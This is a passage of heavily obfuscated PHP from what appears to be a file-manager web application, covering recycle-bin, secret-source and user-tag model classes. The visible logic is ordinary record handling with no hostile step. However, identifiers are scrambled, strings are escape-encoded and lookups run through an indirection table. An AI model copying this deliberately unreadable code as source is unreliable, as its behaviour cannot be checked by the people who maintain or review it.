$ÂÃœ†åÏ, $¡šª™ç[520] => 0, $¡šª™ç[32] => array($¡šª™ç[473], $çô…ƒô˜)); $Ä·—°ÛÜ = $this->field($¡šª™ç[32])->where($Ä‚â—ıÊ)->select(); $Ÿ…´§Í = array_to_keyvalue($Ä·—°ÛÜ, $¡šª™ç[12], $¡šª™ç[32]); return $this->fileNameAutoGet($Ÿ…´§Í, $…Ûš–›, $Ú¨ŸÏõ, $Û¤Ÿîö); } public function fileNameAutoGet($ÜâåàÙÊ, $§’èÂê, $öšàÅœ­, $êòê´†Ó) { $å§ñÏÁü =& $_SERVER[œ—üé‹ê]; if ($öšàÅœ­ == REPEAT_REPLACE || !$ÜâåàÙÊ || !in_array_not_case($§’èÂê, $ÜâåàÙÊ) || $êòê´†Ó && $öšàÅœ­ != REPEAT_RENAME_FOLDER) { return $§’èÂê; } if ($öšàÅœ­ == REPEAT_SKIP) { return !1; } $ºú†‚ù½ = $å§ñÏÁü[10] . get_path_ext($§’èÂê); $ºú†‚ù½ = $ºú†‚ù½ == $å§ñÏÁü[10] || $êòê´†Ó ? $å§ñÏÁü[12] : $ºú†‚ù½; for ($Ëèış¯¨ = 1; $Ëèış¯¨ <= count($ÜâåàÙÊ) + 1; $Ëèış¯¨++) { $ˆºèàş = substr($§’èÂê, 0, strlen($§’èÂê) - strlen($ºú†‚ù½)); $Ô¿ƒæê¹ = $ˆºèàş . "\x28{$Ëèış¯¨}\x29{$ºú†‚ù½}"; if (!in_array_not_case($Ô¿ƒæê¹, $ÜâåàÙÊ)) { return $Ô¿ƒæê¹; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\x6f\x75\162\x63\145\x5f\162\145\143\171\143\154\x65"; protected $dataAuto = array(array("\143\162\x65\141\x74\x65\x54\x69\155\145", "\164\151\155\x65", "\x69\156\163\145\162\164", "\x66\x75\x6e\x63\x74\151\157\x6e")); public function listData($óŒ‚Û€³ = false) { $¿õ›ÀÁ¼ =& $_SERVER[œ—üé‹ê]; $óŒ‚Û€³ = $óŒ‚Û€³ ? $óŒ‚Û€³ : USER_ID; $çóØéŒƒ = $this->where(array($¿õ›ÀÁ¼[1965] => $óŒ‚Û€³))->select(); return array_to_keyvalue($çóØéŒƒ, $¿õ›ÀÁ¼[12], $¿õ›ÀÁ¼[191]); } public function moveToRecycle($›øªŸ’Ú) { $ŞØÙóœ’ =& $_SERVER[œ—üé‹ê]; $·€ÑÀö§ = Model($ŞØÙóœ’[1530]); $ìã¥Š´í = $·€ÑÀö§->sourceInfo($›øªŸ’Ú); if (!$ìã¥Š´í || $ìã¥Š´í[$ŞØÙóœ’[520]] == $ŞØÙóœ’[91]) { return; } $…ç¯¾ğŠ = array($ŞØÙóœ’[506] => $›øªŸ’Ú, $ŞØÙóœ’[1965] => USER_ID, $ŞØÙóœ’[670] => $ìã¥Š´í[$ŞØÙóœ’[188]], $ŞØÙóœ’[671] => $ìã¥Š´í[$ŞØÙóœ’[589]], $ŞØÙóœ’[674] => $ìã¥Š´í[$ŞØÙóœ’[604]]); $this->add($…ç¯¾ğŠ); $this->recycleMove($›øªŸ’Ú, 1); if ($ìã¥Š´í[$ŞØÙóœ’[500]] == $ŞØÙóœ’[91]) { $Ø´šÔ§ª = array($ŞØÙóœ’[674] => array($ŞØÙóœ’[635], $ìã¥Š´í[$ŞØÙóœ’[604]] . $›øªŸ’Ú . $ŞØÙóœ’[636])); $·€ÑÀö§->where($Ø´šÔ§ª)->setField($ŞØÙóœ’[520], 1); } } public function clear() { $this->remove(!1); } public function remove($ß°÷ÅÈ¾ = false, $óšİ´À¿ = false) { $³Â¸¡‚˜ =& $_SERVER[œ—üé‹ê]; $óšİ´À¿ = $óšİ´À¿ ? $óšİ´À¿ : USER_ID; $¢„—Ÿ¦Ô = Model($³Â¸¡‚˜[1530]); $°€Ã‰È« = $this->listData($óšİ´À¿); $ß°÷ÅÈ¾ = $ß°÷ÅÈ¾ === !1 ? !1 : $ß°÷ÅÈ¾; $â¾ó°‹Ò = array(); foreach ($°€Ã‰È« as $ÀÎñ»â¥) { if ($ß°÷ÅÈ¾ != !1 && !in_array($ÀÎñ»â¥, $ß°÷ÅÈ¾)) { continue; } $ÉÁ­°¨­ = $¢„—Ÿ¦Ô->sourceInfo($ÀÎñ»â¥); $¢„—Ÿ¦Ô->remove($ÀÎñ»â¥, !1); $¤ÌÆ¤˜§ = $ÉÁ­°¨­[$³Â¸¡‚˜[188]] . $³Â¸¡‚˜[11] . $ÉÁ­°¨­[$³Â¸¡‚˜[589]]; $â¾ó°‹Ò[$¤ÌÆ¤˜§] = array($³Â¸¡‚˜[670] => $ÉÁ­°¨­[$³Â¸¡‚˜[188]], $³Â¸¡‚˜[589] => $ÉÁ­°¨­[$³Â¸¡‚˜[589]]); $this->where(array($³Â¸¡‚˜[191] => $ÀÎñ»â¥))->delete(); } foreach ($â¾ó°‹Ò as $²¾üäæ) { $¢„—Ÿ¦Ô->targetSpaceUpdate($²¾üäæ[$³Â¸¡‚˜[188]], $²¾üäæ[$³Â¸¡‚˜[589]]); } } public function restore($éÆ›ãşë = false) { $°®ªÛİ³ = $this->listData(); $this->_restoreSource($°®ªÛİ³, $éÆ›ãşë); } public function removeUserAll($±·¬¥ë) { $this->remove(!1, $±·¬¥ë); } public function restoreItem($½Õ¥Ã¶ô) { $this->_restoreSource(array($½Õ¥Ã¶ô), array($½Õ¥Ã¶ô)); } private function _restoreSource($ß¼ÖÊÛÁ, $õıÃ¹ó•) { $´òÆ¼’ã =& $_SERVER[œ—üé‹ê]; $ãÈ™ßñ© = Model($´òÆ¼’ã[1530]); $õıÃ¹ó• = $õıÃ¹ó• == !1 ? !1 : $õıÃ¹ó•; if (!$ß¼ÖÊÛÁ) { return !0; } $ÍşËÙõ = array(); foreach ($ß¼ÖÊÛÁ as $”ªÏõ×‘) { if ($õıÃ¹ó• != !1 && !in_array($”ªÏõ×‘, $õıÃ¹ó•)) { continue; } $¥©¶Õá = $ãÈ™ßñ©->sourceInfo($”ªÏõ×‘); $££¬Û›¤ = $ãÈ™ßñ©->sourceInfo($¥©¶Õá[$´òÆ¼’ã[190]]); if ($££¬Û›¤[$´òÆ¼’ã[520]] == $´òÆ¼’ã[91]) { continue; } $ãÈ™ßñ©->lockMoveStart($”ªÏõ×‘); $this->recycleMove($”ªÏõ×‘, 0); if ($¥©¶Õá[$´òÆ¼’ã[500]] == $´òÆ¼’ã[91]) { $ñè§Ç = array($´òÆ¼’ã[674] => array($´òÆ¼’ã[635], $¥©¶Õá[$´òÆ¼’ã[604]] . $”ªÏõ×‘ . $´òÆ¼’ã[636])); $ãÈ™ßñ©->where($ñè§Ç)->setField($´òÆ¼’ã[520], 0); $this->restoreFolderChildren($”ªÏõ×‘, $ß¼ÖÊÛÁ); } $this->where(array($´òÆ¼’ã[191] => $”ªÏõ×‘))->delete(); $ãÈ™ßñ©->folderSizeReset($¥©¶Õá[$´òÆ¼’ã[190]]); $ÍşËÙõ[] = $¥©¶Õá[$´òÆ¼’ã[190]]; if ($¥©¶Õá[$´òÆ¼’ã[500]] == $´òÆ¼’ã[91]) { $ÍşËÙõ[] = $”ªÏõ×‘; } $ãÈ™ßñ©->lockMoveEnd($”ªÏõ×‘); } $ãÈ™ßñ©->updateModifyTime($ÍşËÙõ); } private function restoreFolderChildren($“ÁŸ‰, $·ÎçŒÕ) { $âØ¹¤ë =& $_SERVER[œ—üé‹ê]; $ø½€ç•ˆ = Model($âØ¹¤ë[1530]); $éø»Ã€§ = array($âØ¹¤ë[191] => array($âØ¹¤ë[7], array())); foreach ($·ÎçŒÕ as $ë¢‚«´ú) { if ($ë¢‚«´ú == $“ÁŸ‰) { continue; } if (!$ø½€ç•ˆ->isParentOf($“ÁŸ‰, $ë¢‚«´ú)) { continue; } $£¥ÕñÒ = $ø½€ç•ˆ->sourceInfo($ë¢‚«´ú); if ($£¥ÕñÒ[$âØ¹¤ë[500]] == $âØ¹¤ë[91]) { $éø»Ã€§[] = array($âØ¹¤ë[674] => array($âØ¹¤ë[635], $£¥ÕñÒ[$âØ¹¤ë[604]] . $ë¢‚«´ú . $âØ¹¤ë[636])); } else { $éø»Ã€§[$âØ¹¤ë[191]][1][] = $ë¢‚«´ú; } } if (!$éø»Ã€§[$âØ¹¤ë[191]][1]) { unset($éø»Ã€§[$âØ¹¤ë[191]]); } if (!$éø»Ã€§) { return; } if (is_array($éø»Ã€§[$âØ¹¤ë[191]]) && is_array($éø»Ã€§[$âØ¹¤ë[191]][1])) { $éø»Ã€§[$âØ¹¤ë[191]][1] = array_unique($éø»Ã€§[$âØ¹¤ë[191]][1]); } $éø»Ã€§[$âØ¹¤ë[1167]] = $âØ¹¤ë[2280]; $ø½€ç•ˆ->where($éø»Ã€§)->setField($âØ¹¤ë[520], 1); } private function recycleMove($ÇÚØŸÙ—, $›ìÁ‚†Å = 1) { $ĞëºÄâ¸ =& $_SERVER[œ—üé‹ê]; $–¿ƒ¿»å = Model($ĞëºÄâ¸[1530]); $­¯›ş½¨ = Model($ĞëºÄâ¸[2507]); $àíÆª•ô = array($ĞëºÄâ¸[191] => $ÇÚØŸÙ—); if ($›ìÁ‚†Å) { $–¿ƒ¿»å->where($àíÆª•ô)->setField($ĞëºÄâ¸[520], 1); $­¯›ş½¨->eventRecycle($ÇÚØŸÙ—, $ĞëºÄâ¸[2508]); } else { $šæÄ¾ì® = $–¿ƒ¿»å->where($àíÆª•ô)->find(); $ñÛïÉ¨© = $šæÄ¾ì®[$ĞëºÄâ¸[500]] == $ĞëºÄâ¸[91]; $¤˜€ŸŞì = $–¿ƒ¿»å->fileNameAuto($šæÄ¾ì®[$ĞëºÄâ¸[190]], $šæÄ¾ì®[$ĞëºÄâ¸[32]], REPEAT_RENAME_FOLDER, $ñÛïÉ¨©); if ($¤˜€ŸŞì != $šæÄ¾ì®[$ĞëºÄâ¸[32]]) { $–¿ƒ¿»å->rename($ÇÚØŸÙ—, $¤˜€ŸŞì); } $–¿ƒ¿»å->where($àíÆª•ô)->setField($ĞëºÄâ¸[520], 0); $­¯›ş½¨->eventRecycle($ÇÚØŸÙ—, $ĞëºÄâ¸[978]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\56\163\157\165\162\x63\145\x53\145\143\x72\x65\x74\x4c\x69\163\x74"; public $field = array("\163\157\x75\162\x63\x65\x49\104", "\164\x79\160\145\x49\x44", "\143\162\145\141\x74\145\x55\x73\145\x72"); } goto aŒŞ»ŠÇ°; cĞİÈ§â: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\145\162\137\x66\141\x76"; protected function cacheFunctionAlias($±ôæûË) { $ÈåñÖÏ× =& $_SERVER[œ—üé‹ê]; return array($ÈåñÖÏ×[2292] => array($ÈåñÖÏ×[2717] . USER_ID, $ÈåñÖÏ×[2293])); } protected function ___listData() { $«”›‡³Ê =& $_SERVER[œ—üé‹ê]; $öä£ü«÷ = array($«”›‡³Ê[1965] => USER_ID, $«”›‡³Ê[573] => array($«”›‡³Ê[2296], 0)); $şºşù¯¼ = $«”›‡³Ê[2718]; $”ù†¦ğ× = $this->field($şºşù¯¼)->where($öä£ü«÷)->order($«”›‡³Ê[2298])->select(); return $”ù†¦ğ× ? $”ù†¦ğ× : array(); } protected function addToTag($®í½‘ı, $Ë¢í¿ì—) { $éû»Ùï€ =& $_SERVER[œ—üé‹ê]; if (!Model($éû»Ùï€[2446])->listData($Ë¢í¿ì—)) { return !1; } if (is_numeric($®í½‘ı)) { $ºñ¤„ş¯ = Model($éû»Ùï€[942])->pathInfo($®í½‘ı); if (!$ºñ¤„ş¯) { return !1; } } else { $ºñ¤„ş¯ = IO::infoSimple($®í½‘ı); if (!$ºñ¤„ş¯) { return !1; } $†£Øªáº = $ºñ¤„ş¯[$éû»Ùï€[32]]; $Ôç‚’×ü = $ºñ¤„ş¯[$éû»Ùï€[33]]; if (isset($ºñ¤„ş¯[$éû»Ùï€[500]])) { $Ôç‚’×ü = $ºñ¤„ş¯[$éû»Ùï€[500]] == $éû»Ùï€[91] ? $éû»Ùï€[78] : $éû»Ùï€[230]; } } $ŠÙ–›ì˜ = array($éû»Ùï€[1965] => USER_ID, $éû»Ùï€[573] => $Ë¢í¿ì—, $éû»Ùï€[510] => $®í½‘ı, $éû»Ùï€[511] => $Ôç‚’×ü ? $Ôç‚’×ü : $éû»Ùï€[505], $éû»Ùï€[509] => $†£Øªáº ? $†£Øªáº : $éû»Ùï€[12], $éû»Ùï€[2182] => 0); if ($this->where($ŠÙ–›ì˜)->find()) { return !1; } return $this->add($ŠÙ–›ì˜); } protected function removeFromTag($›˜¾Úı¯, $Ø¯Ñ‚õì) { $Ş‘™â¦À =& $_SERVER[œ—üé‹ê]; if (!Model($Ş‘™â¦À[2446])->listData($Ø¯Ñ‚õì)) { return !1; } if (is_array($›˜¾Úı¯)) { $›˜¾Úı¯ = array($Ş‘™â¦À[7], $›˜¾Úı¯); } $ğµİˆÙ´ = array($Ş‘™â¦À[1965] => USER_ID, $Ş‘™â¦À[573] => $Ø¯Ñ‚õì, $Ş‘™â¦À[510] => $›˜¾Úı¯); return $this->where($ğµİˆÙ´)->delete(); } protected function removeByTag($åÑ³şåÇ) { $Ùşæİë§ =& $_SERVER[œ—üé‹ê]; if (!$åÑ³şåÇ) { return !1; } $èº–Õºˆ = array($Ùşæİë§[1965] => USER_ID, $Ùşæİë§[573] => $åÑ³şåÇ); return $this->where($èº–Õºˆ)->delete(); } protected function removeBySource($ÇÂ¥×•) { $ı»­é· =& $_SERVER[œ—üé‹ê]; if (is_array($ÇÂ¥×•)) { $ÇÂ¥×• = array($ı»­é·[7], $ÇÂ¥×•); } $Ìñ­¸¦ = array($ı»­é·[1965] => USER_ID, $ı»­é·[573] => array($ı»­é·[1181], 0), $ı»­é·[510] => $ÇÂ¥×•); return $this->where($Ìñ­¸¦)->delete(); } }